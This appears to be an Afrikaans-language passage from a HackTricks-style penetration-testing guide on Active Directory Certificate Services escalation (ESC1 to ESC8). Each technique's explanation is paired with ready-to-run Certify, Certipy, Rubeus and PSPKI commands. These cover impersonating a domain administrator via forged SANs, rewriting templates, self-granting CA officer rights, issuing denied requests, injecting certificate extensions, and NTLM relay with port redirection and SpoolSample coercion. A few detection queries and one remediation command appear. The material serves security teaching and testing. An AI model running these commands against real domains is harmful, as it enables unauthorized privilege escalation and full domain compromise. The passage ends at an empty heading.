# AD CS Domein-escalasie

{{#include ../../../banners/hacktricks-training.md}}


**Dit is 'n opsomming van die escalation technique-afdelings van die plasings:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Verduideliking

### Misconfigured Certificate Templates - ESC1 verduidelik

- **Enrolment-regte word deur die Enterprise CA aan gebruikers met lae voorregte toegeken.**
- **Goedkeuring deur 'n bestuurder word nie vereis nie.**
- **Geen handtekeninge van gemagtigde personeel word benodig nie.**
- **Security descriptors op certificate templates is buitensporig permissief, wat gebruikers met lae voorregte toelaat om enrolment-regte te verkry.**
- **Certificate templates is opgestel om EKUs te definieer wat authentication fasiliteer:**
- Extended Key Usage (EKU)-identifiseerders soos Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), of geen EKU (SubCA) nie, word ingesluit.
- **Die template laat requesters toe om 'n subjectAltName in die Certificate Signing Request (CSR) in te sluit:**
- Active Directory (AD) gee voorkeur aan die subjectAltName (SAN) in 'n certificate vir identiteitsverifikasie indien dit teenwoordig is. Dit beteken dat, deur die SAN in 'n CSR te spesifiseer, 'n certificate aangevra kan word om enige gebruiker (bv. 'n domain administrator) na te boots. Of 'n SAN deur die requester gespesifiseer kan word, word in die certificate template se AD-object deur die `mspki-certificate-name-flag`-eienskap aangedui. Hierdie eienskap is 'n bitmask, en die teenwoordigheid van die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`-flag laat die requester toe om die SAN te spesifiseer.

> [!CAUTION]
> Die uiteengesette configuration laat gebruikers met lae voorregte toe om certificates met enige SAN van hul keuse aan te vra, wat authentication as enige domain principal deur Kerberos of SChannel moontlik maak.

Hierdie feature word soms geaktiveer om die on-the-fly-generering van HTTPS- of host-certificates deur produkte of deployment services te ondersteun, of weens 'n gebrek aan begrip.

Daar word opgemerk dat die skep van 'n certificate met hierdie opsie 'n waarskuwing aktiveer. Dit is nie die geval wanneer 'n bestaande certificate template (soos die `WebServer`-template, wat `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` geaktiveer het) gedupliseer en daarna gewysig word om 'n authentication OID in te sluit nie.<sup>[[6]](#references)</sup>

### Abuse

Om **kwesbare certificate templates te vind**, kan jy die volgende uitvoer:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Om **hierdie kwesbaarheid te misbruik om 'n administrateur voor te doen**, kan 'n mens uitvoer:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Dan kan jy die gegenereerde **certificate na `.pfx`-formaat transformeer** en dit gebruik om weer **met Rubeus of certipy te authenticate**:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Die Windows-binaries "Certreq.exe" en "Certutil.exe" kan gebruik word om die PFX te genereer: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Die enumerasie van certificate templates binne die AD Forest se configuration schema, spesifiek dié wat nie approval of signatures vereis nie, oor ’n Client Authentication- of Smart Card Logon-EKU beskik, en met die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`-flag geaktiveer is, kan uitgevoer word deur die volgende LDAP-query te gebruik:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Wansgekonfigureerde sertifikaatsjablone - ESC2

### Verduideliking

Die tweede misbruikscenario is ’n variasie van die eerste een:

1. Enrollment-regte word deur die Enterprise CA aan gebruikers met lae voorregte toegeken.
2. Die vereiste vir bestuurdergoedkeuring is gedeaktiveer.
3. Die behoefte aan gemagtigde handtekeninge word weggelaat.
4. ’n Te permissiewe sekuriteitsbeskrywer op die sertifikaatsjabloon verleen sertifikaat-enrollment-regte aan gebruikers met lae voorregte.
5. **Die sertifikaatsjabloon is gedefinieer om die Any Purpose EKU of geen EKU in te sluit nie.**

Die **Any Purpose EKU** laat toe dat ’n sertifikaat deur ’n aanvaller vir **enige doel** verkry word, insluitend kliëntverifikasie, bedienerverifikasie, code signing, ens. Dieselfde **tegniek wat vir ESC3 gebruik word** kan aangewend word om hierdie scenario uit te buit.

Sertifikate met **geen EKU’s**, wat as subordinate CA-sertifikate optree, kan vir **enige doel** uitgebuit word en kan **ook gebruik word om nuwe sertifikate te onderteken**. ’n Aanvaller kan dus arbitrêre EKU’s of velde in die nuwe sertifikate spesifiseer deur ’n subordinate CA-sertifikaat te gebruik.

Nuwe sertifikate wat vir **domeinverifikasie** geskep word, sal egter nie funksioneer indien die subordinate CA nie deur die **`NTAuthCertificates`**-objek vertrou word nie, wat die verstekinstelling is. ’n Aanvaller kan nietemin steeds **nuwe sertifikate met enige EKU** en arbitrêre sertifikaatwaardes skep. Dit kan moontlik vir ’n wye reeks doeleindes **misbruik** word (bv. code signing, bedienerverifikasie, ens.) en kan beduidende implikasies vir ander toepassings in die netwerk hê, soos SAML, AD FS of IPSec.<sup>[[6]](#references)</sup>

Om templates wat by hierdie scenario pas binne die AD Forest se konfigurasieskema te enumeriseer, kan die volgende LDAP-navraag uitgevoer word:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Verkeerd gekonfigureerde Enrollment Agent Templates - ESC3

### Verduideliking

Hierdie scenario is soos die eerste en tweede een, maar **misbruik** ’n **ander EKU** (Certificate Request Agent) en **2 verskillende templates** (daarom het dit 2 stelle vereistes),

Die **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), bekend as **Enrollment Agent** in Microsoft-dokumentasie, laat ’n principal toe om vir ’n **sertifikaat** **te enroll** **namens ’n ander gebruiker**.

Die **“enrollment agent”** **enroll** in so ’n **template** en gebruik die gevolglike **sertifikaat om ’n CSR namens die ander gebruiker mede te onderteken**. Dit **stuur** dan die **mede-ondertekende CSR** na die CA, en **enroll** in ’n **template** wat **“enroll on behalf of”** toelaat, waarna die CA reageer met ’n **sertifikaat wat aan die “ander” gebruiker behoort**.<sup>[[6]](#references)</sup>

**Vereistes 1:**

- Enrollment-regte word deur die Enterprise CA aan gebruikers met lae privileges toegestaan.
- Die vereiste vir bestuurdergoedkeuring word weggelaat.
- Geen vereiste vir gemagtigde handtekeninge nie.
- Die security descriptor van die certificate template is buitensporig permissief en verleen enrollment-regte aan gebruikers met lae privileges.
- Die certificate template bevat die Certificate Request Agent EKU, wat die versoek van ander certificate templates namens ander principals moontlik maak.

**Vereistes 2:**

- Die Enterprise CA verleen enrollment-regte aan gebruikers met lae privileges.
- Bestuurdergoedkeuring word omseil.
- Die template se skem weergawe is óf 1 óf hoër as 2, en dit spesifiseer ’n Application Policy Issuance Requirement wat die Certificate Request Agent EKU vereis.
- ’n EKU wat in die certificate template gedefinieer is, laat domain authentication toe.
- Beperkings vir enrollment agents word nie op die CA toegepas nie.

### Misbruik

Jy kan [**Certify**](https://github.com/GhostPack/Certify) of [**Certipy**](https://github.com/ly4k/Certipy) gebruik om hierdie scenario te misbruik:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Die **gebruikers** wat toegelaat word om ’n **enrollment agent certificate** te **verkry**, die templates waarin **enrollment agents** toegelaat word om te enroll, en die **accounts** namens wie die enrollment agent mag optree, kan deur enterprise CAs beperk word. Dit word bereik deur die `certsrc.msc` **snap-in** oop te maak, **regs te klik op die CA**, **Properties te klik**, en dan na die “Enrollment Agents”-oortjie te **navigeer**.

Daar word egter opgemerk dat die **verstek**-instelling vir CAs “**Do not restrict enrollment agents**” is. Wanneer administrators die beperking op enrollment agents aktiveer deur dit op “Restrict enrollment agents” te stel, bly die verstekkonfigurasie uiters permissief. Dit gee **Everyone** toegang om in alle templates as enigiemand te enroll.

## Kwesbare sertifikaatsjabloon-toegangsbeheer - ESC4

### **Verduideliking**

Die **security descriptor** op **certificate templates** definieer die **permissions** waaroor spesifieke **AD principals** met betrekking tot die template beskik.

Indien ’n **attacker** die nodige **permissions** het om ’n **template** te **wysig** en enige van die **exploitable misconfigurations** wat in **vorige afdelings** uiteengesit is te **implementeer**, kan privilege escalation moontlik gemaak word.

Opmerklike permissions wat op certificate templates van toepassing is, sluit in:<sup>[[6]](#references)</sup>

- **Owner:** Verleen implisiete beheer oor die object, wat die wysiging van enige attributes moontlik maak.
- **FullControl:** Verleen volledige beheer oor die object, insluitend die vermoë om enige attributes te wysig.
- **WriteOwner:** Laat die wysiging van die object se eienaar toe na ’n principal onder die attacker se beheer.
- **WriteDacl:** Laat die aanpassing van toegangsbeheer toe, wat moontlik ’n attacker FullControl kan gee.
- **WriteProperty:** Magtig die wysiging van enige object properties.

### Misbruik

Om principals met wysigingsregte op templates en ander PKI-objects te identifiseer, enumereer met Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
'n Voorbeeld van 'n privesc soos die vorige een:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 is wanneer 'n gebruiker skryfvoorregte oor 'n sertifikaatsjabloon het. Dit kan byvoorbeeld misbruik word om die konfigurasie van die sertifikaatsjabloon te oorskryf sodat die sjabloon kwesbaar vir ESC1 word.

Soos ons in die bogenoemde pad kan sien, het slegs `JOHNPC` hierdie voorregte, maar ons gebruiker `JOHN` het die nuwe `AddKeyCredentialLink` edge na `JOHNPC`. Aangesien hierdie tegniek met sertifikate verband hou, het ek hierdie aanval ook geïmplementeer, wat bekend staan as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Hier is 'n klein voorsmakie van Certipy se `shadow auto`-opdrag om die slagoffer se NT hash te verkry.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** kan die konfigurasie van ’n sertifikaatsjabloon met ’n enkele opdrag oorskryf. **By verstek** sal Certipy die konfigurasie **oorskryf om dit kwesbaar vir ESC1 te maak**. Ons kan ook die **`-save-old`-parameter spesifiseer om die ou konfigurasie te stoor**, wat nuttig sal wees om die konfigurasie ná ons aanval te **herstel**.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Toegangsbeheer vir kwesbare PKI-objekte - ESC5

### Verduideliking

Die uitgebreide web van onderling gekoppelde ACL-gebaseerde verhoudings, wat verskeie objekte buiten certificate templates en die certificate authority insluit, kan die sekuriteit van die hele AD CS-stelsel beïnvloed. Hierdie objekte, wat sekuriteit aansienlik kan beïnvloed, sluit die volgende in:

- Die AD-rekenaarobjek van die CA-bediener, wat deur meganismes soos S4U2Self of S4U2Proxy gekompromitteer kan word.
- Die RPC/DCOM-bediener van die CA-bediener.
- Enige afstammeling-AD-objek of houer binne die spesifieke houerpad `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Hierdie pad sluit onder meer houers en objekte soos die Certificate Templates-houer, Certification Authorities-houer, die NTAuthCertificates-objek en die Enrollment Services-houer in.

Die sekuriteit van die PKI-stelsel kan gekompromitteer word indien ’n aanvaller met lae voorregte beheer oor enige van hierdie kritieke komponente verkry.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Verduideliking

Die onderwerp wat in die [**CQure Academy-plasing**](https://cqureacademy.com/blog/enhanced-key-usage) bespreek word, raak ook die implikasies van die **`EDITF_ATTRIBUTESUBJECTALTNAME2`**-vlag, soos deur Microsoft uiteengesit. Wanneer hierdie konfigurasie op ’n Certification Authority (CA) geaktiveer is, laat dit toe dat **gebruiker-gedefinieerde waardes** by die **subject alternative name** vir **enige versoek** ingesluit word, insluitend versoeke wat uit Active Directory® saamgestel word. Gevolglik laat hierdie voorsiening ’n **indringer** toe om deur **enige template** te enroll wat vir domein-**authentication** opgestel is—spesifiek dié wat oop is vir enrollment deur **unprivileged** gebruikers, soos die standaard User-template. As gevolg hiervan kan ’n sertifikaat verkry word waarmee die indringer as ’n domeinadministrateur of **enige ander aktiewe entiteit** binne die domein kan authenticate.<sup>[[9]](#references)</sup>

**Nota**: Die benadering om **alternative names** by ’n Certificate Signing Request (CSR) te voeg deur die `-attrib "SAN:"`-argument in `certreq.exe` (waarna as “Name Value Pairs” verwys word), verskil van die exploit-strategie vir SANs in ESC1. Die onderskeid lê hier in **hoe rekeninginligting ingesluit word**—binne ’n sertifikaatkenmerk eerder as ’n uitbreiding.

### Misbruik

Om te verifieer of die instelling geaktiveer is, kan organisasies die volgende opdrag met `certutil.exe` gebruik:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Hierdie bewerking gebruik in wese **remote registry access**, dus kan ’n alternatiewe benadering wees:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Tools soos [**Certify**](https://github.com/GhostPack/Certify) en [**Certipy**](https://github.com/ly4k/Certipy) is in staat om hierdie verkeerde konfigurasie op te spoor en dit uit te buit:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Om hierdie instellings te wysig, met die veronderstelling dat ’n mens **domeinadministratiewe** regte of ekwivalente regte het, kan die volgende opdrag vanaf enige werkstasie uitgevoer word:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Om hierdie konfigurasie in jou omgewing te deaktiveer, kan die vlag verwyder word met:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Ná die sekuriteitsopdaterings van Mei 2022 sal nuut uitgereikte **sertifikate** ’n **sekuriteitsuitbreiding** bevat wat die **aanvraer se `objectSid`-eienskap** insluit. Vir ESC1 word hierdie SID van die gespesifiseerde SAN afgelei. Vir **ESC6** weerspieël die SID egter die **aanvraer se `objectSid`**, nie die SAN nie.\
> Om ESC6 te misbruik, moet die stelsel vatbaar wees vir ESC10 (Weak Certificate Mappings), wat die **SAN bo die nuwe sekuriteitsuitbreiding prioritiseer**.

## Toegangsbeheer vir ’n kwesbare Certificate Authority - ESC7

### Aanval 1

#### Verduideliking

Toegangsbeheer vir ’n certificate authority word deur ’n stel toestemmings gehandhaaf wat CA-aksies beheer. Hierdie toestemmings kan bekyk word deur `certsrv.msc` te gebruik, met die regtermuisknoppie op ’n CA te klik, eienskappe te kies en dan na die Security-oortjie te navigeer. Daarbenewens kan toestemmings met die PSPKI-module geënumeer word deur opdragte soos:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Dit bied insig in die primêre regte, naamlik **`ManageCA`** en **`ManageCertificates`**, wat onderskeidelik met die rolle van “CA-administrateur” en “Certificate Manager” ooreenstem.<sup>[[6]](#references)</sup>

#### Misbruik

Die besit van **`ManageCA`**-regte op ’n sertifikaatowerheid stel die principal in staat om instellings op afstand met PSPKI te manipuleer. Dit sluit in die aktivering van die **`EDITF_ATTRIBUTESUBJECTALTNAME2`**-vlag om SAN-spesifikasie in enige template toe te laat, ’n kritieke aspek van domein-escalasie.

Hierdie proses kan vereenvoudig word deur PSPKI se **Enable-PolicyModuleFlag**-cmdlet te gebruik, wat wysigings sonder direkte GUI-interaksie moontlik maak.

Die besit van **`ManageCertificates`**-regte fasiliteer die goedkeuring van hangende versoeke en omseil effektief die “CA certificate manager approval”-beveiliging.

’n Kombinasie van die **Certify**- en **PSPKI**-modules kan gebruik word om ’n sertifikaat aan te vra, goed te keur en af te laai:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Aanval 2

#### Verduideliking

> [!WARNING]
> In die **vorige aanval** is **`Manage CA`**-toestemmings gebruik om die **EDITF_ATTRIBUTESUBJECTALTNAME2**-vlag te **aktiveer** om die **ESC6 attack** uit te voer, maar dit sal geen effek hê totdat die CA-diens (`CertSvc`) herbegin word nie. Wanneer ’n user die **Manage CA**-toegangsreg het, word die user ook toegelaat om die **diens te herbegin**. Dit beteken egter **nie dat die user die diens remotely kan herbegin nie**. Verder sal E**SC6 moontlik nie out of the box werk nie** in die meeste omgewings waarop die nodige patches geïnstalleer is, weens die sekuriteitsupdates van Mei 2022.

Daarom word ’n ander aanval hier aangebied.

Voorvereistes:

- Slegs **`ManageCA`-toestemming**
- **`Manage Certificates`**-toestemming (kan vanaf **`ManageCA`** toegestaan word)
- Certificate template **`SubCA`** moet **enabled** wees (kan vanaf **`ManageCA`** enabled word)

Die tegniek berus op die feit dat users met die `Manage CA` _en_ `Manage Certificates`-toegangsreg **failed certificate requests kan issue**. Die **`SubCA`** certificate template is **vulnerable to ESC1**, maar **slegs administrators** kan by die template enroll. Dus kan ’n **user** **request** om by die **`SubCA`** te enroll - wat **denied** sal word - maar daarna deur die manager uitgereik word.<sup>[[6]](#references)</sup>

#### Misbruik

Jy kan die **`Manage Certificates`**-toegangsreg aan jouself toestaan deur jou user as ’n nuwe officer by te voeg.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Die **`SubCA`**-template kan op die **CA** geaktiveer word met die `-enable-template`-parameter. By verstek is die `SubCA`-template geaktiveer.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
As ons aan die voorvereistes vir hierdie aanval voldoen het, kan ons begin deur **'n sertifikaat aan te vra gebaseer op die `SubCA`-sjabloon**.

**Hierdie versoek sal geweie**r** word, maar ons sal die private sleutel stoor en die versoek-ID aanteken.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Met ons **`Manage CA` en `Manage Certificates`** kan ons dan die **mislukte sertifikaatversoek** uitreik met die `ca`-opdrag en die `-issue-request <request ID>`-parameter.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
En laaste kan ons die **uitgereikte sertifikaat herwin** met die `req`-opdrag en die `-retrieve <request ID>`-parameter.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Aanval 3 – Misbruik van Manage Certificates-uitbreiding (SetExtension)

#### Verduideliking

Benewens die klassieke ESC7-misbruike (die aktivering van EDITF-eienskappe of die goedkeuring van hangende versoeke), het **Certify 2.0** ’n splinternuwe primitive onthul wat slegs die *Manage Certificates* (ook bekend as die **Certificate Manager / Officer**)-rol op die Enterprise CA vereis.<sup>[[3]](#references)</sup>

Die `ICertAdmin::SetExtension` RPC-metode kan deur enige principal met *Manage Certificates* uitgevoer word. Hoewel die metode tradisioneel deur wettige CAs gebruik is om uitbreidings op **hangende** versoeke by te werk, kan ’n aanvaller dit misbruik om ’n **nie-verstek sertifikaatuitbreiding** (byvoorbeeld ’n pasgemaakte *Certificate Issuance Policy* OID soos `1.1.1.1`) by ’n versoek wat vir goedkeuring wag, te **voeg**.

Omdat die geteikende template nie ’n verstekwaarde vir daardie uitbreiding definieer nie, sal die CA nie die aanvaller-beheerde waarde oorskryf wanneer die versoek uiteindelik uitgereik word nie. Die gevolglike sertifikaat bevat dus ’n aanvallergekose uitbreiding wat moontlik:

* Aan Application / Issuance Policy-vereistes van ander kwesbare templates voldoen (wat tot privilege escalation lei).
* Bykomende EKUs of policies inspuit wat die sertifikaat onverwagte trust in derdepartystelsels gee.

Kortom, *Manage Certificates* – wat voorheen as die “minder kragtige” helfte van ESC7 beskou is – kan nou vir volledige privilege escalation of langtermyn-persistence aangewend word, sonder om aan CA-konfigurasie te raak of die meer beperkende *Manage CA*-reg te vereis.

#### Misbruik van die primitive met Certify 2.0

1. **Dien ’n sertifikaatversoek in wat *pending* sal bly.** Dit kan afgedwing word met ’n template wat bestuurdergoedkeuring vereis:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Voeg ’n pasgemaakte uitbreiding by die hangende versoek** met die nuwe `manage-ca`-opdrag:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*As die template nie reeds die *Certificate Issuance Policies*-uitbreiding definieer nie, sal die waarde ná uitreiking behoue bly.*

3. **Reik die versoek uit** (indien jou rol ook *Manage Certificates*-goedkeuringsregte het) of wag dat ’n operateur dit goedkeur. Sodra dit uitgereik is, laai die sertifikaat af:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Die gevolglike sertifikaat bevat nou die kwaadwillige issuance-policy OID en kan in daaropvolgende attacks gebruik word (bv. ESC13, domain escalation, ens.).

> NOTA: Dieselfde aanval kan met Certipy ≥ 4.7 deur die `ca`-opdrag en die `-set-extension`-parameter uitgevoer word.

## NTLM Relay na AD CS HTTP Endpoints – ESC8

### Verduideliking

> [!TIP]
> In omgewings waar **AD CS geïnstalleer** is, indien ’n **web enrollment endpoint wat kwesbaar is** bestaan en minstens een **certificate template gepubliseer** is wat **domain computer enrollment en client authentication** toelaat (soos die verstek **`Machine`**-template), word dit moontlik vir **enige rekenaar met die spooler-diens aktief om deur ’n aanvaller gekompromitteer te word**!

Verskeie **HTTP-gebaseerde enrollment-metodes** word deur AD CS ondersteun en beskikbaar gestel deur bykomende serverrolle wat administrateurs kan installeer. Hierdie interfaces vir HTTP-gebaseerde certificate enrollment is vatbaar vir **NTLM relay attacks**. ’n Aanvaller kan vanaf ’n **gekompromitteerde masjien enige AD-account naboots wat via inbound NTLM authenticeer**. Terwyl die slagofferaccount nageboots word, kan hierdie webinterfaces deur ’n aanvaller verkry word om ’n client authentication certificate met die `User`- of `Machine`-certificate templates aan te vra.

- Die **web enrollment-interface** (’n ouer ASP-application beskikbaar by `http://<caserver>/certsrv/`) gebruik by verstek slegs HTTP, wat geen beskerming teen NTLM relay attacks bied nie. Daarbenewens laat dit uitdruklik slegs NTLM-authentication deur sy Authorization HTTP-header toe, wat veiliger authentication-metodes soos Kerberos ontoepaslik maak.
- Die **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service en **Network Device Enrollment Service** (NDES) ondersteun by verstek negotiate authentication via hul Authorization HTTP-header. Negotiate authentication **ondersteun beide** Kerberos en **NTLM**, wat ’n aanvaller toelaat om authentication tydens relay attacks na **NTLM af te gradeer**. Hoewel hierdie webservices HTTPS by verstek aktiveer, bied HTTPS alleen **geen beskerming teen NTLM relay attacks** nie. Beskerming teen NTLM relay attacks vir HTTPS-services is slegs moontlik wanneer HTTPS met channel binding gekombineer word. Ongelukkig aktiveer AD CS nie Extended Protection for Authentication op IIS nie, wat vir channel binding vereis word.<sup>[[6]](#references)</sup>

’n Algemene **probleem** met NTLM relay attacks is die **kort duur van NTLM-sessies** en die onvermoë van die aanvaller om met services te kommunikeer wat **NTLM signing vereis**.

Nietemin word hierdie beperking oorkom deur ’n NTLM relay attack te misbruik om ’n sertifikaat vir die gebruiker te bekom, aangesien die sertifikaat se geldigheidstydperk die sessieduur bepaal en die sertifikaat gebruik kan word met services wat **NTLM signing vereis**. Vir instruksies oor die gebruik van ’n gesteelde sertifikaat, verwys na:


{{#ref}}
account-persistence.md
{{#endref}}

Nog ’n beperking van NTLM relay attacks is dat **’n aanvaller-beheerde masjien deur ’n slagofferaccount geauthenticeer moet word**. Die aanvaller kan óf wag óf probeer om hierdie authentication te **force**:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Misbruik**

[**Certify**](https://github.com/GhostPack/Certify) se `cas` enumereer **geaktiveerde HTTP AD CS-endpoints**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Die `msPKI-Enrollment-Servers`-eienskap word deur enterprise Certificate Authorities (CAs) gebruik om Certificate Enrollment Service (CES)-eindpunte te stoor. Hierdie eindpunte kan met die **Certutil.exe**-tool ontleed en gelys word:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Misbruik met Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Misbruik met [Certipy](https://github.com/ly4k/Certipy)
